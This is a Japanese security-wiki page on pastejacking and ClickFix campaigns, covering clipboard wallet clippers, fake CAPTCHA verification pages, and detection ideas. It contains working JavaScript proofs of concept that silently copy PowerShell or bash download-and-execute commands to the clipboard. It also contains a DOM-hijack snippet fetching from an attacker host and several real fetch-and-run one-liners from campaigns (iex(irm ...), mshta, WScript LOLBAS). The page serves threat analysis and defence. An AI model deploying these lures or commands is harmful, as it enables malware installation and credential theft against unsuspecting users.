# Clipboard Hijacking (Pastejacking) 攻撃

{{#include ../../banners/hacktricks-training.md}}

> 「自分でコピーしていないものは、絶対に貼り付けないこと。」– 古いものだが、今でも有効なアドバイス

## 概要

Clipboard hijacking（*pastejacking* とも呼ばれる）は、ユーザーがコマンドを確認せずにコピー・アンド・ペーストする習慣を悪用します。悪意のある Web ページ（または Electron や Desktop application などの JavaScript を実行できるコンテキスト）は、攻撃者が制御するテキストをプログラムによってシステムの clipboard に配置します。被害者は通常、巧妙に作成されたソーシャルエンジニアリングの指示によって **Win + R**（Run ダイアログ）、**Win + X**（Quick Access / PowerShell）を押すか、terminal を開いて clipboard の内容を*貼り付ける*よう促され、任意のコマンドを即座に実行してしまいます。

**ファイルがダウンロードされず、添付ファイルも開かれない**ため、この手法は添付ファイル、macro、または直接的なコマンド実行を監視する、ほとんどのメールおよび Web コンテンツのセキュリティ制御を回避します。そのため、この攻撃は NetSupport RAT、Latrodectus loader、Lumma Stealer などの一般的な malware family を送り込む phishing campaign で広く使われています。<sup>[[1]](#references)</sup>

## Wallet アドレス置換 clipper

別の **clipboard hijacking** の亜種は、コマンドをまったく貼り付けません。被害者が **cryptocurrency wallet address** をコピーするまで待機し、その後、貼り付ける直前に攻撃者が制御するものへ密かに置き換えます。これは、ユーザーが最初と最後の文字だけを確認することが多いため、長い wallet format に対して特に効果的です。<sup>[[8]](#references)</sup>

実際の攻撃でよく見られる特徴:
- **Thin loader + nested payload**: 表面上の app/exe は正規の trading または「profit」tool に見えますが、実際の clipper は bundle のさらに深い場所に隠されています（例: .NET loader が nested Rust payload を起動する）。
- **Regex-driven replacement**: malware は `bc1...`、`1...`、`3...`、`0x...`、`addr1...`、`DdzFF...`、`ltc...`、`T...`、`r...`、さらには汎用的な **44 文字の Solana-like** string などに一致する文字列を検出し、攻撃者の wallet に書き換えます。
- **Wallet rotation at scale**: 最新の Windows sample は、単一の static address ではなく、currency ごとに**数千個**の replacement wallet を埋め込んでいる場合があります。これにより、盗難のたびに wallet reputation が損なわれることを抑えます。<sup>[[8]](#references)</sup>

### Windows clipper の flow

一般的な実装は、**`AddClipboardFormatListener`** で登録された hidden window です。clipboard が更新されるたびに、malware は通常、次の処理を呼び出します。<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → 現在の clipboard data にアクセスする。
- **`GetClipboardData`** → text を読み取る。
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet string を攻撃者の value に置き換える。

clipper で頻繁に確認される、最小限の hunting regex:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
ユーザーレベルの永続化で十分な影響を与えられます。確認されたパターンの一つは次のとおりです。<sup>[[8]](#references)</sup>
- ペイロードを **`%APPDATA%\silke\silke.exe`** にコピーする
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` 配下に **Startup-folder LNK** を作成する

検知のアイデア:
- クリップボード API を継続的に呼び出しながら、`%APPDATA%` およびユーザーの **Startup** フォルダーに書き込むプロセス。
- 新しい LNK または実行可能ファイルの作成後に、wallet-address のクリップボード書き換えが発生する。
- 未使用ファイルを多数含むアーカイブまたは偽ソフトウェアバンドルと、ネストされたバイナリを起動する小さなランチャー。

### macOS のソーシャルエンジニアリングによる quarantine の削除 + LaunchAgent 永続化

macOS では、一部のキャンペーンが **`unlocker.command`** ヘルパーを配布し、Gatekeeper がアプリを破損している、または未確認の開発元によるものだと通知した場合に、被害者へ右クリック → **Open** を実行するよう指示します。このスクリプトは quarantine を削除し、近くにある `.app` を起動するだけです。<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
これは **Gatekeeper exploit** ではありません。`com.apple.quarantine` xattr に Gatekeeper の判定が依存している事実を悪用した、**ソーシャルエンジニアリングによる quarantine bypass** です。<sup>[[8]](#references)</sup>

実行後、clipper は次のファイルを書き込むことで、現在の user として persistence できます。<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` と `KeepAlive` を設定した LaunchAgent

防御上有用な点として、一部のサンプルには、約30秒ごとに LaunchAgent と wrapper を再書き込みする **self-healing watchdog** が実装されています。実行中の process を kill せずに plist を先に削除すると、malware が直ちに再作成する可能性があります。<sup>[[8]](#references)</sup> Safe cleanup の順序:
1. 実行中の clipper process を kill する。
2. LaunchAgent plist を unload/delete する。
3. `~/launch.sh` とコピーされた payload を削除する。

### Delivery note: fake reputation as a force multiplier

この family では、malware 自体は技術的に単純なままでも、**distribution layer** が大きな役割を果たします。fake GitHub stars/forks、SourceForge の reviews/downloads、YouTube tutorial の comments/views、そして無害に見える VirusTotal の comments/votes を利用して、実行前に binary が trustworthy に見えるようにします。<sup>[[8]](#references)</sup>

## Forced copy buttons and hidden payloads (macOS one-liners)

一部の macOS infostealer は installer site（例: Homebrew）を clone し、ユーザーが表示された text の一部だけを highlight できないように、**“Copy” button の使用を強制**します。clipboard entry には、想定される installer command と追加された Base64 payload（例: `...; echo <b64> | base64 -d | sh`）が含まれているため、UI では追加の stage が隠されたまま、1回の paste で両方が実行されます。<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
以前のキャンペーンでは `document.execCommand('copy')` が使用されていましたが、最近のものでは非同期の **Clipboard API**（`navigator.clipboard.writeText`）に依存しています。<sup>[[2]](#references)</sup>

## ClickFix / ClearFake のフロー

1. ユーザーが typosquatting されたサイト、または侵害されたサイト（例: `docusign.sa[.]com`）にアクセスする
2. Injected **ClearFake** JavaScript が `unsecuredCopyToClipboard()` ヘルパーを呼び出し、Base64 でエンコードされた PowerShell one-liner を気付かれないようにクリップボードへ保存する。
3. HTML の指示で被害者に次の操作を促す: *「**Win + R** を押し、コマンドを貼り付けて Enter を押すと問題が解決します。」*
4. `powershell.exe` が実行され、正規の実行ファイルと悪意のある DLL を含むアーカイブをダウンロードする（典型的な DLL sideloading）。
5. loader が追加のステージを復号し、shellcode を inject して persistence（例: scheduled task）をインストールする – 最終的に NetSupport RAT / Latrodectus / Lumma Stealer を実行する。<sup>[[1]](#references)</sup>

### NetSupport RAT Chain の例
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe`（正規の Java WebStart）は、そのディレクトリで `msvcp140.dll` を検索します。
* 悪意のある DLL は **GetProcAddress** で API を動的に解決し、**curl.exe** を介して 2 つのバイナリ（`data_3.bin`、`data_4.bin`）をダウンロードし、ローリング XOR キー `"https://google.com/"` を使用して復号し、最終的な shellcode をインジェクトして、NetSupport RAT である **client32.exe** を `C:\ProgramData\SecurityCheck_v1\` に解凍します。<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe** で `la.txt` をダウンロード
2. **cscript.exe** 内で JScript downloader を実行
3. MSI payload を取得 → 署名付きアプリケーションの横に `libcef.dll` を配置 → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### MSHTA 経由の Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** 呼び出しは、非表示の PowerShell スクリプトを起動します。このスクリプトは `PartyContinued.exe` を取得し、`Boat.pst`（CAB）を抽出し、`extrac32` とファイル連結によって `AutoIt3.exe` を再構築し、最終的にブラウザ認証情報を `sumeriavgv.digital` へ exfiltrate する `.a3x` スクリプトを実行します。<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

一部の ClickFix campaign はファイルの download を完全に省略し、被害者に、WSH 経由で JavaScript を取得して実行し、永続化し、C2 を毎日 rotate する one-liner を paste するよう指示します。確認された chain の例：<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
主な特徴
- 難読化された URL を実行時に逆順化し、簡単な調査を回避する。
- JavaScript は Startup LNK（WScript/CScript）を介して永続化し、現在の日付によって C2 を選択することで、ドメインを迅速にローテーションできる。<sup>[[3]](#references)</sup>

日付によって C2 をローテーションするために使用される最小限の JS フラグメント：<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
次の段階では通常、persistenceを確立してRAT（例：PureHVNC）を取得するloaderがdeployされ、ハードコードされた証明書にTLS pinningを行い、trafficをchunkingすることが多い。<sup>[[3]](#references)</sup>

このvariantに特有のDetection ideas
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js`（または`cscript.exe`）。
- Startup artifacts: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` 内のLNKから、`%TEMP%`/`%APPDATA%` 配下のJS pathを指定してWScript/CScriptを実行するもの。
- `.split('').reverse().join('')` または `eval(a.responseText)` を含むRegistry/RunMRUおよびcommand-line telemetry。
- 長いcommand lineを使わずに長大なscriptを渡すため、大きなstdin payloadを付けて `powershell -NoProfile -NonInteractive -Command -` を繰り返し実行する。
- updaterらしいtask/path（例：`\GoogleSystem\GoogleUpdater`）の下で、後続して `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` のようなLOLBinsを実行するScheduled Tasks。

Threat hunting
- 毎日rotationされるC2 hostnamesと、`.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` パターンのURLs。
- clipboard write eventsと、それに続くWin+R paste、直後の `powershell.exe` executionを相関させる。

Blue-teamsはclipboard、process-creation、registry telemetryを組み合わせて、pastejacking abuseを特定できる。

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` には **Win + R** commandsのhistoryが保存されるため、通常とは異なるBase64 / obfuscated entriesを探す。
* Security Event ID **4688**（Process Creation）で、`ParentImage` == `explorer.exe` かつ `NewProcessName` が { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } に含まれるもの。
* Event ID **4663** で、疑わしい4688 eventの直前に `%LocalAppData%\Microsoft\Windows\WinX\` またはtemporary folders配下でfile creationsが発生しているもの。
* EDR clipboard sensors（存在する場合）– `Clipboard Write` の直後に新しいPowerShell processが作成されたことを相関させる。

## IUAM-style verification pages（ClickFix Generator）：clipboard copy-to-console + OS-aware payloads

最近のcampaignでは、偽のCDN/browser verification pages（「Just a moment…」、IUAM-style）を大量生成し、ユーザーにclipboardからOS-specific commandsをnative consolesへcopyさせる。これによりexecutionをbrowser sandboxの外へ移し、WindowsとmacOSの両方で機能する。<sup>[[4]](#references)</sup>

builder-generated pagesの主な特徴
- `navigator.userAgent` によるOS detectionでpayloadsを調整する（Windows PowerShell/CMDとmacOS Terminal）。非対応OS向けにoptional decoys/no-opsを用意し、illusionを維持することもある。
- 無害なUI actions（checkbox/Copy）の実行時にautomatic clipboard-copyを行う一方、visible textはclipboard contentと異なる場合がある。
- Mobile blockingとstep-by-step instructions付きのpopover：Windows → Win+R→paste→Enter、macOS → open Terminal→paste→Enter。
- optional obfuscationとsingle-file injectorにより、Tailwind-styled verification UIでcompromised siteのDOMを上書きする（新しいdomain registrationは不要）。<sup>[[4]](#references)</sup>

Example：clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS初回実行時のpersistence
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` を使用すると、ターミナルを閉じた後も実行が継続し、目に見える痕跡を減らせます。<sup>[[4]](#references)</sup>

侵害済みサイト上でのページ乗っ取り
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAM-style lures に特化した検知・ハンティングのアイデア
- Web: Clipboard API を検証ウィジェットにバインドするページ、表示テキストとクリップボードペイロードの不一致、`navigator.userAgent` による分岐、不審なコンテキストにおける Tailwind + single-page replace。
- Windows endpoint: ブラウザー操作の直後に `explorer.exe` → `powershell.exe`/`cmd.exe` が起動する挙動、`%TEMP%` から実行される batch/MSI インストーラー。
- macOS endpoint: ブラウザーイベントの近辺で Terminal/iTerm が `bash`/`curl`/`base64 -d` を起動する挙動、ターミナルを閉じても存続するバックグラウンドジョブ。
- `RunMRU` の Win+R 履歴およびクリップボードへの書き込みを、その後のコンソールプロセス作成と相関付ける。

関連する supporting techniques も参照

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake は引き続き WordPress サイトを侵害し、外部ホスト（Cloudflare Workers、GitHub/jsDelivr）を連鎖させる loader JavaScript をインジェクトしており、現在の lure ロジックを取得するために、ブロックチェーンの「etherhiding」呼び出し（例：Binance Smart Chain API エンドポイント（`bsc-testnet.drpc[.]org`）への POST）まで利用している。最近のオーバーレイでは、何かをダウンロードさせる代わりに、ユーザーへ one-liner のコピー＆ペースト（T1204.004）を指示する fake CAPTCHA が多用されている。<sup>[[6]](#references)</sup>
- Initial execution は signed script hosts/LOLBAS に委任される傾向が強まっている。2026年1月のチェーンでは、従来の `mshta` の使用を、`WScript.exe` 経由で実行される組み込みの `SyncAppvPublishingServer.vbs` に置き換え、alias/wildcard を含む PowerShell-like 引数を渡してリモートコンテンツを取得していた。<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` は署名済みで、通常は App-V で使用されます。`WScript.exe` と組み合わせ、通常とは異なる引数（`gal`/`gcm` alias、ワイルドカード化された cmdlet、jsDelivr URL）を指定すると、ClearFake 向けの高シグナルな LOLBAS stage になります。<sup>[[6]](#references)</sup>
- 2026 年 2 月、偽 CAPTCHA payload は純粋な PowerShell download cradle に回帰しました。実際の例を 2 つ示します。<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- 1つ目のchainはメモリ内で実行する `iex(irm ...)` grabberです。2つ目は `WinHttp.WinHttpRequest.5.1` を介してstagingし、一時 `.ps1` を書き込み、非表示ウィンドウで `-ep bypass` を指定して起動します。<sup>[[6]](#references)</sup>

これらのvariantに対するDetection/huntingのヒント
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs`、またはclipboardへの書き込み／Win+Rの直後に実行されるPowerShell cradle。
- Command-line keywords: `SyncAppvPublishingServer.vbs`、`WinHttp.WinHttpRequest.5.1`、`-UseBasicParsing`、`%TEMP%\FVL.ps1`、jsDelivr／GitHub／Cloudflare Workerのdomain、またはraw IPを使用する `iex(irm ...)` pattern。
- Network: web browsingの直後に、script host／PowerShellからCDN worker hostまたはblockchain RPC endpointへoutboundする通信。
- File/registry: `%TEMP%` 配下での一時 `.ps1` 作成、およびこれらのone-linerを含むRunMRU entry。外部URLまたはobfuscated alias stringを指定してsigned-script LOLBAS（WScript/cscript/mshta）を実行する動作をblock／alertする。

## June 2026 ClickFix tradecraft: paste telemetry、fake verification comment、LOLBIN chaining

Recent Red Canary telemetryが示す安定したindicatorは、**1つの正確なcommandではなく**、**user-assisted paste-and-run**、**trusted interpreter／LOLBIN**、**obfuscated flag**、**remote retrieval**、**immediate execution**の組み合わせです。<sup>[[7]](#references)</sup>

### 注目すべきoperator pattern

- **Paste confirmation telemetry**: 一部のpayloadは、実際のstageの前に `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` を実行します。これにより、ウィンドウを短時間かつ目立たない状態に保ちながら、user interactionを確認します。
- **Fake verification comment**: PowerShell one-linerは、`# Security check ✔️ I'm not a robot Verification ID: 138105` のようなstringを末尾に追加することがあります。これにより、Run／`cmd.exe`／PowerShell historyにpasteされた後も、commandがCAPTCHA関連に見える状態を保ちます。
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` は、command line上にstatic URLを置かずに、メモリ内でdownload-and-executeを実行します。
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` は、flagに通常とは異なる大文字／小文字やUnicode風の文字を使用して脆弱なdetectionを回避しつつ、`msiexec.exe` のように見せかけます。
- **Caret-escaped LOLBin chain**: `cmd.exe` は `^` escape（`s^t^a^r^t`、`^c^u^r^l^`、`^m^s^h^t^a^`）でkeywordを隠し、nested shellをminimizedで起動し、attacker contentを `.pdf` などのbenign extensionで保存した後、`mshta` を通じて実行できます。<sup>[[7]](#references)</sup>
## Mitigations

1. Browser hardening – clipboardへのwrite-access（`dom.events.asyncClipboard.clipboardItem` など）を無効化するか、user gestureを必須にする。
2. Security awareness – sensitive commandはユーザーが*入力*するか、まずtext editorにpasteするよう教育する。
3. PowerShell Constrained Language Mode／Execution Policy、およびApplication Controlにより、任意のone-linerをblockする。
4. Network controls – 既知のpastejackingおよびmalware C2 domainへのoutbound requestをblockする。

## Related Tricks

* **Discord Invite Hijacking** は、ユーザーをmalicious serverへ誘導した後、同じClickFix approachを悪用することがよくあります。

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Clickを修正する：ClickFix Attack Vectorの防止](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Pure Curtainの内側：RATからBuilder、Coderまで](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [ClickFix Factory：IUAM ClickFix Generatorの初の公開](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025年、Infostealerの年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights：2026年2月](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights：2026年6月](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – StarsからUpvotesへ：Crypto Clipboard Hijackerを支えるFake Reputation](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
